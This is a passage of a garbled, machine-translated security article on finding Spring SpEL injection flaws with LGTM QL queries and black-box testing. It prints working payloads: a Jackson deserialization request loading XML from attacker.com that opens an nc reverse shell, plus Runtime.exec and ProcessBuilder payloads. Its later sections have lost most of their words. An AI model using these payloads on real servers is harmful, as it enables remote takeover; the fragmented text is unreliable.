class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql">  Verwenden von LGTM QL </h2><br><p>  Die Verwendung von LGTM QL (f√ºr die Zwecke dieses Artikels reduzieren wir es einfach auf QL) ist eine weitere interessante M√∂glichkeit, nach Schwachstellen zu suchen. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://lgtm.com</a> </p><br><p>  Es sollte sofort seinen Mangel festlegen.  Sie k√∂nnen kostenlos nur Projekte analysieren, die sich in offenen Repositorys auf GitHub befinden, weil  Um ein Bild des Projekts aufzunehmen, l√§dt LGTM das Projekt auf seinen Server hoch und kompiliert es dort.  Wenn Sie dies jedoch nicht st√∂rt, er√∂ffnet Ihnen das LGTM QL gro√üartige M√∂glichkeiten bei der Analyse des Anwendungscodes. </p><br><p>  Was ist eine QL-Anwendungsanalyse? </p><br><p>  Wie bereits erw√§hnt, m√ºssen Sie zun√§chst einen Snapshot der Anwendung erstellen. </p><br><p>  Wenn der Snapshot fertig ist und dies mehrere Stunden dauern kann, k√∂nnen Sie eine SQL-√§hnliche Abfrage als Teil der QL-Syntax schreiben.  Dazu k√∂nnen Sie das Plugin f√ºr Eclipse verwenden oder direkt in der Konsole auf der Projekt-QL-Seite agieren. </p><br><p>  Weil  Jetzt betrachten wir Spring, und dies ist das Framework f√ºr Java. Sie m√ºssen die f√ºr Sie interessante Klasse und die Methode aus dieser Klasse beschreiben, deren Aufruf als anf√§llig angesehen wird.  F√ºr uns ist dies jede Klasse, die eine Methode enth√§lt, die ExpressionParser aufruft. </p><br><p>  Anschlie√üend treffen wir eine Auswahl aller Methoden, die unseren Anforderungen entsprechen, indem wir beispielsweise das Auftreten einer Variablen in einer Methode beschreiben, die bereinigen w√ºrde, und die Bedingung, nicht in diese Methode zu fallen. </p><br><p><img src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p>  Was muss also getan werden, um die CVE-Sicherheitsanf√§lligkeit 2018-1273 zu finden? <br>  Nachdem wir das Projektimage erhalten und verbunden haben, verwenden wir die QL-Konsole, um den Anrufbaum zu beschreiben, der uns interessiert.  Daf√ºr: <br>  Wir beschreiben die Expression-Parser-Klasse: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p>  Und die Methoden, die f√ºr die Ausf√ºhrung innerhalb der ExpressionParser-Klasse verwendet werden k√∂nnen: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p>  Jetzt m√ºssen Sie diese Beschreibungen miteinander verbinden und eine Auswahl treffen: </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p>  Eine solche Abfrage gibt alle Methoden zur√ºck, die mit parse oder mit dem Namen doParseExpression beginnen und zur ExpressionParser-Klasse geh√∂ren.  Aber das ist zu viel, sagst du, und du wirst recht haben.  Ein Filter ist erforderlich. </p><br><p>  Weil  Im Code gibt es einen Kommentar des Formulars: </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p>  Dies k√∂nnte beispielsweise eine Suche nach ‚ÄûPfad‚Äú in Javadoc sein.  Spring kommentiert seinen Code in sehr hoher Qualit√§t, und wir k√∂nnen Methodenaufrufe mit dem erforderlichen Kommentar finden und gleichzeitig alle in den Tests enthaltenen Methoden entfernen.  All dies kann wie folgt beschrieben werden: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p>  Um die Klasse, Methoden und Filter nach Javadoc zu kombinieren, hat die Abfrage f√ºr die Auswahl die folgende Form: </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p>  Dieses Beispiel kann als einfach und im Allgemeinen redundant angesehen werden, um nach einer bestimmten Sicherheitsanf√§lligkeit zu suchen.  Viel interessanter ist die Suche nach Fehlern beim Schreiben eines Fixes, weil  Darin m√ºssen Sie die Klasse selbst angeben, die f√ºr die Pr√ºfung verantwortlich ist, die Methoden, die sie immer aufrufen und die vor der Pr√ºfung ausgef√ºhrt werden. </p><br><p>  Ein Aufruf einer Methode, die immer verifyPath aufruft: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p>  Ein Aufruf einer Methode, die vor verifyPath ausgef√ºhrt wird: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p>  Betrachten Sie eine weitere interessante Sicherheitsanf√§lligkeit.  Ihr Verst√§ndnis ist sehr wichtig, weil  Es zeigt, dass sich der Fehler m√∂glicherweise in einer Bibliothek eines Drittanbieters befindet, und zeigt, wie mit XML-Annotationen versehene Beans verwendet werden k√∂nnen. </p><br><h2 id="jackson-and-bean">  Jackson und Bohne </h2><br><p>  CVE-2017-17485 basiert auf der Verwendung von FileSystemXmlApplicationContext - es handelt sich um einen eigenst√§ndigen Anwendungskontext in Form von XML, der Kontextdefinitionsdateien vom Dateisystem oder von der URL empf√§ngt. </p><br><p>  Gem√§√ü der Dokumentation k√∂nnen Sie so Beans aus einer Datei laden und den Anwendungskontext neu laden. <br>  "... Erstellen Sie einen neuen FileSystemXmlApplicationContext, laden Sie die Definitionen aus den angegebenen XML-Dateien und aktualisieren Sie den Kontext automatisch." </p><br><p>  Jackson ist eine Bibliothek, mit der Sie alle Objekte au√üer den auf der schwarzen Liste aufgef√ºhrten Objekten serialisieren und deserialisieren k√∂nnen.  Diese Gelegenheit wird h√§ufig von Angreifern genutzt.  Bei dieser Sicherheitsanf√§lligkeit musste der Angreifer das Objekt <code>org.springframework.context.support.FileSystemXmlApplicationContext</code> mit einem Wert √ºbergeben, der den Pfad zu der vom Angreifer kontrollierten Datei enth√§lt. </p><br><p>  Das hei√üt,  Im Anfragetext k√∂nnen Sie den folgenden JSON √ºbergeben: </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml enth√§lt bin-Parameter: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Weil  Da wir die Bean-Klasse java.lang.ProcessBuilder verwendet haben, die √ºber eine Startmethode verf√ºgt, liest Spring nach dem erneuten Laden des Kontexts den Ausdruck, der ProcessBuilder startet, √ºber die SpEL-Eigenschaft, wodurch der Server gezwungen wird, mit nc eine Verbindung zu uns herzustellen. </p><br><p>  Es lohnt sich, auf die als Beispiel angegebene spel.xml zu achten, z  Es zeigt, wie beim Ausf√ºhren des Befehls Parameter √ºbergeben werden. </p><br><p>  Und auf welche andere Weise k√∂nnen wir unsere Bean laden oder den Kontext neu laden? </p><br><p>  Selbst mit einem kurzen Blick auf die Spring-Dokumentation finden Sie einige weitere Klassen, die f√ºr uns n√ºtzlich sein k√∂nnen. </p><br><p>  ClassPathXmlApplicationContext und AbstractXmlApplicationContext √§hneln FileSystem, jedoch werden ClassPath- und XML-annotierte Beans als Pfad zur Konfiguration verwendet. </p><br><p>  Es gibt einen weiteren interessanten Punkt im Zusammenhang mit dem Neuladen des Kontexts - @RefreshScope. </p><br><p>  Alle mit @RefreshScope kommentierten Spring Bean werden zum Startzeitpunkt aktualisiert.  Und alle Komponenten, die es verwenden, erhalten beim n√§chsten Aufruf der Methode ein neues Objekt. Sie werden vollst√§ndig initialisiert und abh√§ngig davon eingef√ºhrt. </p><br><p>  RefreshScope ist eine Komponente im Kontext und verf√ºgt √ºber eine √∂ffentliche refreshAll-Methode, mit der alle Komponenten in einem Bereich durch L√∂schen des Zielcaches aktualisiert werden k√∂nnen.  Daher kann der Benutzer bei Verwendung von @RefreshScope auf die URL verweisen, die mit / refresh endet, und dadurch die mit Anmerkungen versehenen Beans neu laden. </p><br><h2 id="drugie-utility">  Andere Dienstprogramme </h2><br><p>  Es gibt viele andere Plugins und Programme, mit denen Sie den Code analysieren und die Sicherheitsanf√§lligkeit finden k√∂nnen. </p><br><ul><li>  Jprofiler - wird als separater Anwendungsserver und Plugin f√ºr IDE installiert.  Erm√∂glicht die Analyse einer laufenden Anwendung.  Es ist sehr praktisch, das Verhalten von Objekten durch grafische Darstellung zu analysieren. </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p>  Von den Minuspunkten - bezahlt, hat aber eine freie Frist von 10 Tagen.  Es gilt als eines der besten Dienstprogramme zur Analyse des Anwendungsverhaltens, nicht nur unter Sicherheitsgesichtspunkten. </p><br><ul><li>  Xrebel - bezahlt, wir haben keine M√∂glichkeit einer Probezeit gefunden.  Gilt aber auch als einer der besten. </li><li>  Coverity - verwendet seine eigenen Server f√ºr die Analyse, daher ist es nur f√ºr diejenigen geeignet, die keine Angst haben, ihren Code zu gestalten. </li><li>  Checkmarx - sehr ber√ºhmt, bezahlt, kennt viele Sprachen und wirft viele falsch positive Ergebnisse ab.  Es ist jedoch besser, auf den Ort hinzuweisen, an dem die Theorie m√∂glicherweise einen Fehler enth√§lt, als einen echten Fehler zu √ºbersehen. </li><li>  OWASP Dependency Check - wird als praktisches Plug-In f√ºr verschiedene Builder bereitgestellt.  Wir haben es geschafft, es bei der Analyse einer Java-Anwendung auf Maven und Ant zu testen.  Unterst√ºtzt auch .Net.  Den Ergebnissen der Arbeit zufolge enth√§lt es einen praktischen Bericht, in dem veraltete Bibliotheken und ihnen bekannte Schwachstellen aufgef√ºhrt sind. </li><li>  Findbugs - es wurde bereits fr√ºher erw√§hnt.  Es gibt viele Implementierungen, aber die Option findbugs_cli hat sich als die bequemste herausgestellt und zeigt aus irgendeinem Grund mehr Probleme.  Es kann wie folgt verwendet werden: <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL - Ein Beispiel f√ºr seine Verwendung wurde bereits zuvor gegeben.  Wir m√∂chten separat sagen, dass es auch einen kostenpflichtigen Anwendungsfall gibt, nach dem Sie einen lokalen Server zur Analyse Ihres Codes erhalten. <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans ‚Äî     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : ‚Äú ,  Spring,   SpEL injection?‚Äù </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression.  Das hei√üt,  (,   )        ,      . </p><br><p>  Das hei√üt,            .      ,          ,       ‚Äú‚Äù . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de433034/">https://habr.com/ru/post/de433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de433014/index.html">Witze √ºber die j√ºngste Freilassung von Astronauten in den Weltraum</a></li>
<li><a href="../de433016/index.html">Schnittstellen√§nderungen, mehrschichtige Animationen und strukturiertes visuelles Chaos: Ein √úberblick √ºber Webtrends f√ºr 2019</a></li>
<li><a href="../de433018/index.html">UDB. Was ist das Teil 2. Datenpfad</a></li>
<li><a href="../de433030/index.html">Live: Front-End-Leistung</a></li>
<li><a href="../de433032/index.html">Wie medizinisches Routing funktioniert - das zeigen wir am Beispiel der DOC + -Anwendung</a></li>
<li><a href="../de433036/index.html">Tipps zur Organisation der IT in einem kleinen Unternehmen</a></li>
<li><a href="../de433038/index.html">Warum lernen Vermarkter das Programmieren?</a></li>
<li><a href="../de433042/index.html">Intel wird den Prozessor mit dreidimensionaler Architektur Foveros im Jahr 2019 ver√∂ffentlichen</a></li>
<li><a href="../de433044/index.html">OpenJDK-Quellcode enth√§lt zu viele Schimpfw√∂rter</a></li>
<li><a href="../de433046/index.html">Die ganze Wahrheit √ºber RTOS. Artikel Nr. 25. Datenkan√§le: Einf√ºhrung und Basisdienste</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>